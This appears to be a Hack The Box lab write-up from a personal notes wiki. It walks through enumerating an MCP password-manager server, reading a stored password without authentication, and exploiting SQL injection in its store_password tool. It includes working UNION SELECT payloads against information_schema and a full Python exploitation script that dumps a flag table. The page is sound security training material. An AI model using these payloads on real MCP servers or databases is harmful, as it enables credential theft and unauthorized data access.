---
tags: [lab, attack/ai]
module: attacking_ai_applications_and_systems
last_updated: 2026-05-13
source_count: 1
---

# AI Applications & Systems — Skills Assessment

Capstone assessment: enumerate a production-style MCP password manager, extract stored credentials, and exploit a SQL injection vulnerability in the `store_password` tool to dump a flag from the database.

## Target

| Field | Value |
|-------|-------|
| Target | MCP password manager server |
| Endpoint | `http://STMIP:STMPO/mcp/` |
| Database | MariaDB |
| Difficulty | Hard |

## Objective

> Obtain the flag.

---

## Setup

```bash
pip3 install fastmcp
```

---

## Phase 1: Enumerate the MCP Server

Use the standard MCP enumeration script to map all available capabilities:

```python
import asyncio
from fastmcp import Client

client = Client("http://STMIP:STMPO/mcp/")

async def main():
    async with client:
        resources          = await client.list_resources()
        resource_templates = await client.list_resource_templates()
        tools              = await client.list_tools()

        print("Resources:")
        for r in resources:
            print(f"  {r.name} — {r.description.strip()}")

        print("\nResource Templates:")
        for rt in resource_templates:
            print(f"  {rt.uriTemplate} — {rt.description.strip()}")

        print("\nTools:")
        for t in tools:
            params = list(t.inputSchema.get('properties').keys())
            print(f"  {t.name}({', '.join(params)}) — {t.description.strip()}")

asyncio.run(main())
```

**Server capabilities:**

```
Resources:
  get_access_logs  — Provides the MCP server access logs.
  get_error_logs   — Provides the MCP server error logs.
  get_server_uptime — Get the server uptime.
  count_files      — Provides the number of stored files.
  get_platforms    — Provides a list of all stored platforms for which passwords are stored.

Resource Templates:
  getfile://{file_name*}  — Get content of a stored file.
  password://{platform}   — Fetch stored password for the specified platform.

Tools:
  store_file(file_content, file_name)       — Store a file.
  store_password(password, platform)        — Store a password for the specified platform.
```

**Attack surface observations:**
- `get_platforms` — enumerates what platforms have stored passwords (useful reconnaissance)
- `password://{platform}` — template that fetches a password by platform name; `{platform}` is user-controlled
- `store_password(password, platform)` — writes to the database; `platform` is user-controlled and likely unsanitized in the SQL query

---

## Phase 2: Enumerate Stored Data

### List Platforms

```python
try:
    result = await client.read_resource("resource://platforms")
    print(result[0].text)
except Exception as e:
    print(f"[-] {e}")
```

Output: `["rootlocker.htb"]`

One platform is stored: `rootlocker.htb`.

### Fetch the Stored Password

```python
try:
    result = await client.read_resource("password://rootlocker.htb")
    print(result[0].text)
except Exception as e:
    print(f"[-] {e}")
```

Output: `DummyPassword123`

The server exposes stored passwords without authentication — any client can read all credentials. However, we still need to find the flag, which is presumably in a separate database table not exposed through the normal API.

---

## Phase 3: Discover the SQL Injection in store_password

The `store_password` tool writes to the database. The `platform` parameter is likely used in an `INSERT` or `UPDATE` statement without parameterization. Test with a single quote:

```python
try:
    result = await client.call_tool("store_password", {
        "password": "DummyPassword123",
        "platform": "rootlocker.htb'"
    })
    print(result.content[0].text)
except Exception as e:
    print(f"[-] {e}")
```

Output:

```
Error calling tool 'store_password': 1064 (42000): You have an error in your SQL syntax;
check the manual that corresponds to your MariaDB server version for the right syntax to
use near ''rootlocker.htb'' LIMIT 1' at line 1
```

The MariaDB syntax error confirms the injection. The error also reveals the query structure includes a `LIMIT 1` clause, which is consistent with a `SELECT ... WHERE platform = 'X' LIMIT 1` pattern used in an upsert.

---

## Phase 4: UNION-Based SQL Injection via store_password

Since the tool has a write-oriented path, the injection fires in a context that may return the query result. Use UNION SELECT to read from other tables.

### Determine Column Count

```python
result = await client.call_tool("store_password", {
    "password": "DummyPassword123",
    "platform": "rootlocker.htb' UNION SELECT 1-- -"
})
print(result.content[0].text)
```

Output: `1` — UNION SELECT succeeded with one column. The query returns the selected value.

### Confirm Database Engine

```python
result = await client.call_tool("store_password", {
    "password": "DummyPassword123",
    "platform": "roottlocker.htb' UNION SELECT @@version-- -"
})
print(result.content[0].text)
```

Output: MariaDB version string — confirmed MySQL/MariaDB syntax required.

Note: use a non-existent platform name (`roottlocker.htb` with a double 't') so the original row is not found and the UNION SELECT result is returned instead of the stored password.

### Enumerate Tables

```python
result = await client.call_tool("store_password", {
    "password": "DummyPassword123",
    "platform": "roottlocker.htb' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- -"
})
print(result.content[0].text)
```

The output is a long comma-separated list of all tables from `information_schema` plus user tables. Look for non-system tables at the end:

```
...,user_variables,INNODB_TABLESPACES_ENCRYPTION,...,session_status,flag,passwords
```

Two interesting tables: `flag` and `passwords`.

### Enumerate Columns in the flag Table

```python
result = await client.call_tool("store_password", {
    "password": "DummyPassword123",
    "platform": 'roottlocker.htb\' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name = "flag"-- -'
})
print(result.content[0].text)
```

Output: `id,flag`

### Extract the Flag

```python
result = await client.call_tool("store_password", {
    "password": "DummyPassword123",
    "platform": "roottlocker.htb' UNION SELECT flag FROM flag-- -"
})
print(result.content[0].text)
```

**Flag:** `HTB{5a2d65cc776d6d22cd27513260a4932b}`

---

## Complete Exploitation Script

```python
import asyncio
from fastmcp import Client

client = Client("http://STMIP:STMPO/mcp/")

async def sqli(platform_payload):
    async with client:
        try:
            result = await client.call_tool("store_password", {
                "password": "DummyPassword123",
                "platform": platform_payload
            })
            return result.content[0].text
        except Exception as e:
            return str(e)

async def main():
    # 1. Enumerate tables
    tables = await sqli("roottlocker.htb' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- -")
    print("[+] Tables:", tables)

    # 2. Enumerate columns in flag table
    cols = await sqli('roottlocker.htb\' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name = "flag"-- -')
    print("[+] flag columns:", cols)

    # 3. Dump the flag
    flag = await sqli("roottlocker.htb' UNION SELECT flag FROM flag-- -")
    print("[+] FLAG:", flag)

asyncio.run(main())
```

---

## Key Techniques

### Why the Non-Existent Platform Trick Works

The original SQL query is something like:

```sql
SELECT platform FROM passwords WHERE platform = 'rootlocker.htb' LIMIT 1
```

When the platform exists, the row is returned and the stored password is shown. When we use a non-existent value (`roottlocker.htb`), no row matches, so the UNION SELECT result fills in as the returned row. If you inject into an existing platform name, both the stored password AND the injected result may compete.

### Double vs Single Table Filtering

MariaDB's `information_schema.tables` returns ALL tables including system tables. Filtering by `table_schema = database()` narrows results to the current database:

```sql
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = database()
```

Without filtering, the output is hundreds of system table names — the user tables (`flag`, `passwords`) appear at the end.

---

## Lessons Learned

- **MCP tools that perform write operations are SQLi candidates.** `store_password` inserts or updates a database row using user-supplied values — a write path without parameterization is injectable.
- **Use a non-existent key value to see UNION results cleanly.** When injecting into a lookup query, if the key exists the original row competes with your UNION result; use a typo'd or garbage value to ensure only your injection is returned.
- **Password managers are high-value MCP SQLi targets.** The `passwords` table in a password manager is the crown jewel — even if the normal API validates access, SQLi bypasses all application-layer controls.
- **Full enumeration before exploitation:** Reading `get_platforms` and `password://rootlocker.htb` confirmed the database schema direction before testing injection, reducing guesswork.

---

## Related Pages

- [[enumeration/mcp_servers]] — MCP capability enumeration methodology
- [[attack/ai/mcp_security]] — MCP threat model, vulnerable server patterns
- [[labs/htb/attacking_ai_applications_and_systems/vulnerable_mcp_servers]] — the three-question lab that teaches MCP SQLi foundations
- [[attack/sql_databases]] — SQL injection reference
- [[protocols/mcp]] — MCP protocol reference

## Sources

- raw/lab/attacking_ai_applications_and_systems/skills_assessemnt.md
